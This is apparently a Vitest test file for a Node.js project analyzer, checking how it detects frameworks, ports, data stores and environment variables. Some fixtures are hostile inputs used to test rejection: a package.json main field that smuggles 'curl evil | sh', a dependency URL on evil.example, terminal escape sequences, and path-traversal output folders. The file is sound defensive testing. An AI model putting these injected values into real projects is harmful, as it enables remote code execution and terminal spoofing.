import { analyzeSnapshot } from '@hero-cloud/analyzer';
import type { Analysis } from '@hero-cloud/core';
import { memorySnapshot } from '@hero-cloud/core/testing';
import { describe, expect, it } from 'vitest';
import { nodePlugin } from './index.js';

const pkg = (value: Record<string, unknown>): string => JSON.stringify(value);

function analyze(files: Record<string, string>, root?: string): Promise<Analysis> {
  return analyzeSnapshot(memorySnapshot(files), {
    detectors: nodePlugin.detectors,
    name: 'fixture',
    ...(root === undefined ? {} : { root }),
  });
}

const capabilities = (analysis: Analysis): string[] => [
  ...new Set(analysis.detections.map((d) => d.capability)),
];
const questionIds = (analysis: Analysis): string[] => analysis.openQuestions.map((q) => q.id);

describe('runtime', () => {
  it('reads the package manager from the packageManager field before lockfiles', async () => {
    const a = await analyze({
      'package.json': pkg({
        name: 'x',
        packageManager: 'pnpm@9.15.0',
        devDependencies: { vite: '^7' },
        scripts: { build: 'vite build' },
      }),
      'package-lock.json': '{}',
    });
    expect(a.spec.frontend?.build?.command).toBe('pnpm run build');
  });

  it.each([
    ['yarn.lock', 'yarn run build'],
    ['bun.lockb', 'bun run build'],
    ['pnpm-lock.yaml', 'pnpm run build'],
    ['package-lock.json', 'npm run build'],
  ])('uses %s to choose %s', async (lockfile, expected) => {
    const a = await analyze({
      'package.json': pkg({ devDependencies: { vite: '^7' }, scripts: { build: 'vite build' } }),
      [lockfile]: '',
    });
    expect(a.spec.frontend?.build?.command).toBe(expected);
  });

  it('records the Node version from .nvmrc or engines', async () => {
    const a = await analyze({
      'package.json': pkg({ engines: { node: '>=20' } }),
      '.nvmrc': 'v22.12.0\n',
    });
    expect(a.spec.extensions?.['x-node']).toMatchObject({ nodeVersion: '22.12.0' });
    const b = await analyze({ 'package.json': pkg({ engines: { node: '>=20' } }) });
    expect(b.spec.extensions?.['x-node']).toMatchObject({ nodeVersion: '>=20' });
  });

  it('survives a package.json that is not valid JSON', async () => {
    const a = await analyze({ 'package.json': '{ not json' });
    expect(a.spec.application.name).toBe('fixture');
    expect(a.openQuestions).toEqual([]);
  });

  it('survives a package.json with hostile or odd shapes', async () => {
    const a = await analyze({
      'package.json': pkg({
        name: 42,
        dependencies: ['express'],
        scripts: { build: 5 },
        workspaces: 'x',
        engines: null,
      }),
    });
    expect(a.spec.application.name).toBe('fixture');
  });
});

describe('frontend', () => {
  it('detects a static Next.js export and uses its out folder', async () => {
    const a = await analyze({
      'package.json': pkg({
        dependencies: { next: '^15', react: '^19' },
        scripts: { build: 'next build' },
      }),
      'next.config.mjs': "export default { output: 'export' };",
    });
    expect(a.spec.frontend).toEqual({
      framework: 'next',
      build: { command: 'npm run build', output: 'out' },
    });
    expect(a.spec.services).toBeUndefined();
  });

  it('treats Next.js without static export as a server', async () => {
    const a = await analyze({
      'package.json': pkg({
        dependencies: { next: '^15' },
        scripts: { build: 'next build', start: 'next start' },
      }),
      'next.config.mjs': 'export default {};',
    });
    expect(a.spec.frontend).toBeUndefined();
    expect(a.spec.services?.[0]).toMatchObject({
      id: 'api',
      type: 'http',
      runtime: 'nodejs',
      start: { command: 'npm start' },
    });
  });

  it('honours a custom Vite outDir but never a path that escapes', async () => {
    const files = (outDir: string) => ({
      'package.json': pkg({ devDependencies: { vite: '^7' }, scripts: { build: 'vite build' } }),
      'vite.config.ts': `export default { build: { outDir: '${outDir}' } };`,
    });
    expect((await analyze(files('public-dist'))).spec.frontend?.build?.output).toBe('public-dist');
    expect((await analyze(files('../outside'))).spec.frontend?.build?.output).toBe('dist');
    expect((await analyze(files('/etc'))).spec.frontend?.build?.output).toBe('dist');
  });

  it('detects Create React App and Astro with their output folders', async () => {
    const cra = await analyze({
      'package.json': pkg({
        dependencies: { 'react-scripts': '5', react: '19' },
        scripts: { build: 'react-scripts build' },
      }),
    });
    expect(cra.spec.frontend).toEqual({
      framework: 'react',
      build: { command: 'npm run build', output: 'build' },
    });
    const astro = await analyze({
      'package.json': pkg({ dependencies: { astro: '5' }, scripts: { build: 'astro build' } }),
    });
    expect(astro.spec.frontend).toEqual({
      framework: 'astro',
      build: { command: 'npm run build', output: 'dist' },
    });
  });

  it('asks when there is no build script', async () => {
    const a = await analyze({ 'package.json': pkg({ devDependencies: { vite: '^7' } }) });
    expect(questionIds(a)).toContain('frontend.build-missing');
    expect(a.spec.frontend).toEqual({ framework: 'vite' });
  });

  it('detects a plain HTML site only when there is no package.json', async () => {
    expect((await analyze({ 'index.html': '<p>x</p>' })).spec.frontend).toEqual({
      framework: 'static',
    });
    const withPackage = await analyze({ 'index.html': 'x', 'package.json': pkg({ name: 'x' }) });
    expect(withPackage.spec.frontend).toBeUndefined();
  });
});

describe('server', () => {
  it('only counts runtime dependencies, not dev tooling', async () => {
    const a = await analyze({
      'package.json': pkg({ devDependencies: { express: '^5' }, scripts: { start: 'x' } }),
    });
    expect(a.spec.services).toBeUndefined();
  });

  it.each(['express', 'fastify', 'hono', 'koa', '@hapi/hapi', '@nestjs/core'])(
    'detects %s',
    async (dependency) => {
      const a = await analyze({
        'package.json': pkg({ dependencies: { [dependency]: '1' }, scripts: { start: 'node .' } }),
      });
      expect(a.spec.services?.[0]).toMatchObject({ id: 'api', type: 'http' });
    },
  );

  it('finds the port from listen calls and PORT defaults, choosing the most common', async () => {
    const a = await analyze({
      'package.json': pkg({ dependencies: { express: '5' }, scripts: { start: 'node .' } }),
      'a.js': 'app.listen(9000)',
      'b.js': 'const PORT = process.env.PORT || 8081; app.listen(PORT)',
      'c.js': 'server.listen(8081)',
    });
    expect(a.spec.services?.[0]?.port).toBe(8081);
  });

  it('ignores impossible ports and asks instead', async () => {
    const a = await analyze({
      'package.json': pkg({ dependencies: { express: '5' }, scripts: { start: 'node .' } }),
      'a.js': 'app.listen(99999)',
    });
    expect(a.spec.services?.[0]?.port).toBeUndefined();
    expect(questionIds(a)).toContain('service.port-unknown');
  });

  it('falls back to main, then to a conventional entry file, then asks', async () => {
    const main = await analyze({
      'package.json': pkg({ dependencies: { express: '5' }, main: 'lib/app.js' }),
    });
    expect(main.spec.services?.[0]?.start).toEqual({ command: 'node lib/app.js' });
    const entry = await analyze({
      'package.json': pkg({ dependencies: { express: '5' } }),
      'server.js': '',
    });
    expect(entry.spec.services?.[0]?.start).toEqual({ command: 'node server.js' });
    const none = await analyze({ 'package.json': pkg({ dependencies: { express: '5' } }) });
    expect(questionIds(none)).toContain('service.start-unknown');
  });

  it('refuses a main field that could carry shell syntax', async () => {
    const a = await analyze({
      'package.json': pkg({ dependencies: { express: '5' }, main: 'x.js; curl evil | sh' }),
    });
    expect(JSON.stringify(a.spec)).not.toContain('evil');
    expect(questionIds(a)).toContain('service.start-unknown');
  });

  it('only accepts health routes that are plain paths', async () => {
    const a = await analyze({
      'package.json': pkg({ dependencies: { express: '5' }, scripts: { start: 'node .' } }),
      'a.js': "app.get('/api/healthz', h)",
    });
    expect(a.spec.services?.[0]?.healthPath).toBe('/api/healthz');
  });

  it('never copies source text into evidence', async () => {
    const a = await analyze({
      'package.json': pkg({ dependencies: { express: '5' }, scripts: { start: 'node .' } }),
      'a.js': "const SECRET_TOKEN = 'hunter2'; app.listen(3000)",
    });
    expect(JSON.stringify(a)).not.toContain('hunter2');
  });
});

describe('scheduled', () => {
  it('detects a cron library and asks when it lives inside a web server', async () => {
    const alone = await analyze({
      'package.json': pkg({ dependencies: { 'node-cron': '3' }, scripts: { start: 'node .' } }),
    });
    expect(alone.spec.services?.[0]).toMatchObject({ id: 'jobs', type: 'scheduled' });
    expect(questionIds(alone)).not.toContain('scheduled.inside-server');
    const inside = await analyze({
      'package.json': pkg({
        dependencies: { 'node-cron': '3', express: '5' },
        scripts: { start: 'node .' },
      }),
    });
    expect(questionIds(inside)).toContain('scheduled.inside-server');
  });
});

describe('data', () => {
  it.each([
    [{ '@aws-sdk/lib-dynamodb': '3' }, { id: 'kv', type: 'key-value' }],
    [{ pg: '8' }, { id: 'database', type: 'relational', engine: 'postgres' }],
    [{ mysql2: '3' }, { id: 'database', type: 'relational', engine: 'mysql' }],
    [{ mongoose: '8' }, { id: 'documents', type: 'document', engine: 'mongodb' }],
    [{ ioredis: '5' }, { id: 'cache', type: 'cache', engine: 'redis' }],
    [{ meilisearch: '1' }, { id: 'search', type: 'search' }],
  ])('maps %j to %j', async (dependencies, expected) => {
    const a = await analyze({ 'package.json': pkg({ dependencies }) });
    expect(a.spec.data).toContainEqual(expected);
  });

  it('asks about persistence for SQLite', async () => {
    const a = await analyze({ 'package.json': pkg({ dependencies: { 'better-sqlite3': '11' } }) });
    expect(a.spec.data).toEqual([{ id: 'database', type: 'relational', engine: 'sqlite' }]);
    expect(questionIds(a)).toContain('data.sqlite-persistence');
  });

  it('reads the Prisma provider, and asks when the engine is unknown', async () => {
    const known = await analyze({
      'package.json': pkg({ dependencies: { '@prisma/client': '6' } }),
      'prisma/schema.prisma':
        'datasource db {\n  provider = "postgresql"\n  url = env("DATABASE_URL")\n}',
    });
    expect(known.spec.data).toEqual([{ id: 'database', type: 'relational', engine: 'postgres' }]);
    const unknown = await analyze({ 'package.json': pkg({ dependencies: { typeorm: '0.3' } }) });
    expect(unknown.spec.data).toEqual([{ id: 'database', type: 'relational' }]);
    expect(questionIds(unknown)).toContain('data.engine-unknown');
  });
});

describe('storage and auth', () => {
  it('detects object storage and asks about uploads that have no destination', async () => {
    const s3 = await analyze({
      'package.json': pkg({ dependencies: { '@aws-sdk/client-s3': '3' } }),
    });
    expect(s3.spec.storage).toEqual([{ id: 'assets', type: 'object' }]);
    const uploads = await analyze({ 'package.json': pkg({ dependencies: { multer: '2' } }) });
    expect(questionIds(uploads)).toContain('storage.uploads');
  });

  it('flags code that writes to disk when there is no object storage', async () => {
    const a = await analyze({
      'package.json': pkg({ name: 'x' }),
      'a.js': "fs.writeFile('/tmp/x', data)",
    });
    expect(questionIds(a)).toContain('storage.writes-to-disk');
  });

  it('detects authentication with high confidence for Cognito and lower for generic libraries', async () => {
    const cognito = await analyze({
      'package.json': pkg({ dependencies: { 'amazon-cognito-identity-js': '6' } }),
    });
    expect(cognito.spec.auth).toEqual({ required: true });
    expect(cognito.detections.find((d) => d.capability === 'authentication')?.confidence).toBe(0.9);
    const passport = await analyze({ 'package.json': pkg({ dependencies: { passport: '0.7' } }) });
    expect(passport.detections.find((d) => d.capability === 'authentication')?.confidence).toBe(
      0.6,
    );
  });
});

describe('environment', () => {
  it('collects names from templates and code, never values, and skips platform variables', async () => {
    const a = await analyze({
      'package.json': pkg({ name: 'x' }),
      '.env.example':
        'export DB_URL=postgres://user:pass@host/db\nSTRIPE_KEY=sk_live_abc\n# COMMENTED=1\nlower=1\n',
      'a.ts':
        'process.env.API_TOKEN; process.env["WEBHOOK_SECRET"]; process.env.NODE_ENV; process.env.PORT; process.env.AWS_REGION',
      'b.ts': 'import.meta.env.VITE_PUBLIC_URL',
    });
    expect(a.spec.environment).toEqual([
      'API_TOKEN',
      'DB_URL',
      'STRIPE_KEY',
      'VITE_PUBLIC_URL',
      'WEBHOOK_SECRET',
    ]);
    expect(JSON.stringify(a)).not.toContain('sk_live_abc');
    expect(JSON.stringify(a)).not.toContain('pass@host');
  });

  it('ignores variables inside test files', async () => {
    const a = await analyze({
      'package.json': pkg({ name: 'x' }),
      'a.test.ts': 'process.env.ONLY_IN_TESTS',
    });
    expect(a.spec.environment).toBeUndefined();
  });
});

describe('monorepo and unrecognized projects', () => {
  const workspace = {
    'package.json': pkg({ name: 'root', workspaces: ['apps/*'] }),
    'apps/api/package.json': pkg({ dependencies: { express: '5' } }),
    'apps/web/package.json': pkg({ devDependencies: { vite: '7' } }),
    'apps/docs/package.json': pkg({}),
  };

  it('asks which package to deploy and lists the candidates', async () => {
    const a = await analyze(workspace);
    expect(a.openQuestions.find((q) => q.id === 'monorepo.choose-package')?.options).toEqual([
      'apps/api',
      'apps/docs',
      'apps/web',
    ]);
    expect(capabilities(a)).toContain('monorepo');
  });

  it('does not ask when the root itself is deployable', async () => {
    const a = await analyze({
      ...workspace,
      'package.json': pkg({
        workspaces: ['apps/*'],
        dependencies: { express: '5' },
        scripts: { start: 'x' },
      }),
    });
    expect(questionIds(a)).not.toContain('monorepo.choose-package');
  });

  it('analyzes one package of a monorepo on request', async () => {
    const a = await analyze(workspace, 'apps/api');
    expect(a.spec.services?.[0]).toMatchObject({ id: 'api', type: 'http' });
  });

  it('says so when nothing is recognized instead of guessing', async () => {
    const a = await analyze({
      'package.json': pkg({ name: 'mystery', dependencies: { lodash: '4' } }),
    });
    expect(questionIds(a)).toContain('app.not-recognized');
    expect(a.spec.services).toBeUndefined();
    expect(a.spec.frontend).toBeUndefined();
  });

  it('notes a plain start script as a possible process', async () => {
    const a = await analyze({
      'package.json': pkg({ dependencies: { lodash: '4' }, scripts: { start: 'node main.js' } }),
    });
    expect(capabilities(a)).toContain('process-service');
  });
});

describe('vocabulary', () => {
  it('uses only standard capabilities, evidence kinds, and declared question codes', async () => {
    const { evidenceKinds, parseEvidence, standardCapabilities } =
      await import('@hero-cloud/plugin-sdk');
    const { nodeQuestionCodes } = await import('./index.js');
    const everything = {
      'package.json': pkg({
        name: 'all',
        engines: { node: '>=20' },
        workspaces: ['apps/*'],
        dependencies: {
          express: '5',
          'node-cron': '3',
          pg: '8',
          mysql2: '3',
          mongoose: '8',
          ioredis: '5',
          meilisearch: '1',
          '@aws-sdk/client-s3': '3',
          '@aws-sdk/lib-dynamodb': '3',
          multer: '2',
          passport: '0.7',
          'better-sqlite3': '11',
          typeorm: '0.3',
        },
        devDependencies: { vite: '7', react: '19' },
        scripts: { build: 'x', start: 'y' },
      }),
      'index.html': '<p>x</p>',
      'hero.yaml': "version: '1'\napplication:\n  name: x\n",
      '.env.example': 'A_VAR=\n',
      'a.js': 'fs.writeFile("x", y); app.listen(3000)',
      'apps/a/package.json': '{}',
      'apps/b/package.json': '{}',
    };
    const analysis = await analyze(everything);
    for (const detection of analysis.detections) {
      expect(standardCapabilities, detection.capability).toContain(detection.capability);
      for (const evidence of detection.evidence) {
        expect(evidenceKinds, evidence).toContain(parseEvidence(evidence).kind);
      }
    }
    const declared = new Set<string>(nodeQuestionCodes);
    const analyzerOwned = new Set([
      'detector.failed',
      'merge.conflict',
      'repository-spec.invalid',
      'repository-spec.unverified',
    ]);
    for (const question of analysis.openQuestions) {
      expect(declared.has(question.code) || analyzerOwned.has(question.code), question.code).toBe(
        true,
      );
    }
  });
});

describe('hostile package.json values never reach results', () => {
  it('leaves out version ranges that are not plain ranges', async () => {
    const a = await analyze({
      'package.json': pkg({
        dependencies: { express: '^5\u001b]0;pwned\u0007', pg: 'http://evil.example/x.tgz' },
        scripts: { start: 'node .' },
      }),
    });
    const evidence = a.detections.flatMap((d) => d.evidence).join('\n');
    expect(evidence).toContain('dependency:express');
    expect(evidence).not.toContain('\u001b');
    expect(evidence).not.toContain('pwned');
    expect(evidence).not.toContain('evil.example');
    expect(evidence).toContain('dependency:pg');
  });

  it('does not echo a name with control characters into the application name', async () => {
    const a = await analyze({ 'package.json': pkg({ name: '\u001b[31mred\u001b[0m' }) });
    expect(a.spec.application.name).not.toContain('\u001b');
  });
});
